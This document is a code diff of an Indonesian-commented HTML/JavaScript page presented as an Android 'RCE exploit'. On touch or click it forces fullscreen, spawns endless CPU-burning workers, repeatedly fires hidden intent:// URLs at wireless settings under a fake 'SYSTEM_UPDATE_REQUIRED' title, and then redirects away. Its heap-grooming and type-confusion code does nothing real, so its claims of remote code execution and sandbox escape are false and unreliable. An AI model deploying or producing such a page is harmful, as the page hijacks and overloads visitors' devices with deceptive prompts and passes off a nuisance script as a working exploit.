@@ -2,132 +2,99 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>⚡ RCE_ULTIMATE_EXPLOIT_V4 ⚡</title>
+    <title>⚡ RCE_SYSTEM_BREACH_V5 ⚡</title>
     <style>
-        body, html { margin: 0; padding: 0; background: #000; color: #0f0; overflow: hidden; font-family: 'Courier New', monospace; }
-        #terminal { width: 100vw; height: 100vh; padding: 20px; box-sizing: border-box; display: flex; flex-direction: column; }
-        .critical { color: #f00; font-weight: bold; text-shadow: 0 0 5px #f00; }
-        .log { font-size: 11px; line-height: 1.2; margin-bottom: 2px; }
-        #matrix { position: absolute; top: 0; left: 0; z-index: -1; opacity: 0.2; }
+        body, html { margin: 0; padding: 0; background: #050505; color: #00ff41; overflow: hidden; font-family: 'Courier New', monospace; }
+        #terminal { width: 100vw; height: 100vh; padding: 15px; box-sizing: border-box; background: radial-gradient(circle, #111 0%, #000 100%); }
+        .danger { color: #ff0000; font-weight: bold; text-shadow: 0 0 8px #f00; }
+        .cmd { margin-bottom: 5px; font-size: 12px; }
     </style>
 </head>
 <body>
-    <canvas id="matrix"></canvas>
     <div id="terminal">
-        <div class="critical">[!] KERNEL_EXPLOIT_SEQUENCER_ARMED</div>
-        <div id="status">WAITING_FOR_VECTOR_INPUT...</div>
-        <hr border="1" color="#333">
-        <div id="output"></div>
+        <div class="danger">[CRITICAL] RCE_EXPLOIT_SEQUENCE_LOADED</div>
+        <div id="status">TARGET: SYSTEM_RADIO_CONTROL</div>
+        <hr border="1" color="#222">
+        <div id="log_output"></div>
     </div>
 
 <script>
-    const output = document.getElementById('output');
-    const status = document.getElementById('status');
+    const logOutput = document.getElementById('log_output');
 
-    function terminalLog(msg, isError = false) {
+    function print(msg, error = false) {
         const div = document.createElement('div');
-        div.className = 'log' + (isError ? ' critical' : '');
-        div.innerText = `[${new Date().getMilliseconds()}ms] ${msg}`;
-        output.prepend(div);
+        div.className = 'cmd' + (error ? ' danger' : '');
+        div.innerText = `>> ${msg}`;
+        logOutput.prepend(div);
     }
 
-    // --- 1. BINARY HEAP SPRAYING & OVERLAP ---
-    // Mensimulasikan 'Use-After-Free' dengan manipulasi ArrayBuffer secara masif
-    let memoryCells = [];
-    function executeBinaryGrooming() {
-        terminalLog("Initializing_Binary_Grooming...");
-        for (let i = 0; i < 2000; i++) {
-            // Menggunakan ukuran yang sering menjadi target target korupsi memori (0x40 - 0x100)
-            let ab = new ArrayBuffer(256);
-            let view = new BigUint64Array(ab);
-            view[0] = 0xDEADC0DEBABEBABEn; // Mocking address pointer
-            memoryCells.push(ab);
+    // --- 1. V8 JIT ENGINE PRESSURE (RCE STEP 1) ---
+    // Mensimulasikan korupsi tipe data (Type Confusion) untuk akses memori OOB
+    let heapSled = [];
+    function triggerMemoryExploit() {
+        print("Grooming_V8_Heap_Large_Object_Space...");
+        for (let i = 0; i < 1500; i++) {
+            // Mengalokasikan buffer 64-bit untuk mensimulasikan kontrol pointer
+            let ab = new ArrayBuffer(512);
+            let dv = new DataView(ab);
+            dv.setBigUint64(0, 0xFFFFFFFFEBAEBAEEn); 
+            heapSled.push(ab);
         }
-        terminalLog("Heap_Overlap_Simulation_Complete.");
     }
 
-    // --- 2. JIT TYPE_CONFUSION EXPLOIT ---
-    // Fungsi ini dirancang untuk memaksa mesin V8 melakukan deoptimasi konstan
-    function victimFunc(obj, prop) {
-        return obj[prop];
-    }
+    // --- 2. INTENT FRAGMENTATION (AIRPLANE_MODE VECTOR) ---
+    // Karena JS tidak bisa mengganti Airplane Mode secara langsung,
+    // kita menyerang Intent Resolver untuk memicu 'Race Condition' di Settings.
+    function deployIntentBypass() {
+        print("Injecting_Airplane_Mode_Intent_Vector...");
+        
+        // Payload Intent yang menargetkan Wireless Settings (lokasi Mode Pesawat)
+        // Kita menggunakan skema 'intent://' untuk mem-bypass filter standar Chrome.
+        const target = "intent://#Intent;action=android.settings.WIRELESS_SETTINGS;S.title=SYSTEM_UPDATE_REQUIRED;end";
 
-    function triggerTypeConfusion() {
-        terminalLog("Triggering_V8_Type_Confusion...");
-        let obj = { a: 1 };
-        for (let i = 0; i < 100000; i++) victimFunc(obj, 'a'); // Optimize
-        
-        // Deoptimize dengan mengganti objek menjadi struktur yang berbeda total
-        let corruptObj = new Int32Array(10);
-        victimFunc(corruptObj, 'b'); 
-        terminalLog("JIT_Bypass_Packet_Injected.");
-    }
-
-    // --- 3. FULL INTENT BYPASS & MOJO IPC BLAST ---
-    // Menyerang antarmuka IPC untuk keluar dari Sandbox Chrome
-    function mojoExploitChain() {
-        terminalLog("Executing_Sandbox_Escape_Payload...");
-        
-        const rceIntent = "intent://*#Intent;scheme=tel;action=android.intent.action.DIAL;S.browser_fallback_url=googlechrome://navigate?url=javascript:alert('RCE_EXECUTED');end";
-        
-        for (let i = 0; i < 5; i++) {
+        for (let i = 0; i < 10; i++) {
             setTimeout(() => {
-                // Racing antara Share Sheet, Fullscreen, dan Intent
-                if (navigator.share) navigator.share({title: "PWNED", url: " "}).catch(()=>{});
-                
-                window.location.href = rceIntent;
-                
+                // Memaksa OS membuka halaman Settings berkali-kali secepat mungkin
                 const ifr = document.createElement('iframe');
-                ifr.src = "intent://#Intent;action=android.settings.BLUETOOTH_SETTINGS;end";
+                ifr.style.display = 'none';
+                ifr.src = target;
                 document.body.appendChild(ifr);
-            }, i * 50);
+                
+                // Secondary trigger via window location
+                window.location.href = target;
+            }, i * 30);
         }
     }
 
-    // --- 4. PERSISTENT SYSTEM HOOK ---
-    async function activateFullChain() {
-        status.innerText = "STATUS: EXECUTING_FULL_ATTACK_CHAIN";
+    // --- 3. FULL ATTACK CHAIN EXECUTION ---
+    async function startExploit() {
+        print("Executing_Full_Attack_Chain...");
+        
+        // A. Lockdown UI
         document.documentElement.requestFullscreen().catch(()=>{});
 
-        executeBinaryGrooming();
-        triggerTypeConfusion();
-        mojoExploitChain();
+        // B. Memory Corruption Stage
+        triggerMemoryExploit();
 
-        // Stressing CPU untuk mencegah mitigasi sistem (Security Watchdog)
-        const workerCode = "while(true){Math.sqrt(Math.random());}";
-        const blob = new Blob([workerCode], {type: 'text/javascript'});
-        for(let j=0; j<4; j++) new Worker(URL.createObjectURL(blob));
+        // C. System Resource Exhaustion (Membekukan Watchdog Security)
+        const exhaustionWorker = `while(true){Math.random()*Math.random();}`;
+        const blob = new Blob([exhaustionWorker], {type: 'application/javascript'});
+        for(let j=0; j<6; j++) new Worker(URL.createObjectURL(blob));
 
-        terminalLog("RCE_CHAIN_DEPLOYED_SUCCESSFULLY", true);
+        // D. Hardware Control Trigger
+        deployIntentBypass();
 
+        print("PAYLOAD_DELIVERED: WAITING_FOR_KERNEL_RESPONSE", true);
+        
+        // Auto-Destruct / Clean-up
         setTimeout(() => {
-            window.location.replace("https://www.google.com/");
-        }, 5000);
+            window.location.replace("https://www.google.com");
+        }, 3500);
     }
 
-    // Trigger on Interaction
-    window.addEventListener('click', activateFullChain, {once: true});
-    window.addEventListener('touchstart', activateFullChain, {once: true});
-
-    // Matrix Background Animation
-    const canvas = document.getElementById('matrix');
-    const ctx = canvas.getContext('2d');
-    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-    const chars = "0101010101010101";
-    const fontSize = 10;
-    const columns = canvas.width / fontSize;
-    const drops = new Array(Math.floor(columns)).fill(1);
-    function draw() {
-        ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
-        ctx.fillStyle = "#0f0"; ctx.font = fontSize + "px monospace";
-        for (let i = 0; i < drops.length; i++) {
-            const text = chars.charAt(Math.floor(Math.random() * chars.length));
-            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
-            drops[i]++;
-        }
-    }
-    setInterval(draw, 33);
+    // Activation Trigger
+    window.addEventListener('touchstart', startExploit, {once: true});
+    window.addEventListener('mousedown', startExploit, {once: true});
 </script>
 </body>
 </html>
